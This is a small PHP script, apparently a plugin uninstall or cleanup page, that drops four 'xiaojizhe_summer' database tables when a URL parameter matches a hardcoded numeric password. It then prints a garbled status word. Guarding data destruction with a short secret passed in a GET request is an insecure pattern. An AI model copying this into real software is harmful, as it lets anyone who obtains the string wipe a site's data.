<?php
/**
 * Created by PhpStorm.
 * User: Administrator
 * Date: 2018/6/1
 * Time: 15:36
 */
$password = $_GET['password'];
if($password=='555389'){
    DB::query("DROP TABLE `xiaojizhe_summer_jing`");
    DB::query("DROP TABLE `xiaojizhe_summer_leader`");
    DB::query("DROP TABLE `xiaojizhe_summer_zan`");
    DB::query("DROP TABLE `xiaojizhe_summer_comment`");
    echo "Íê³É";
}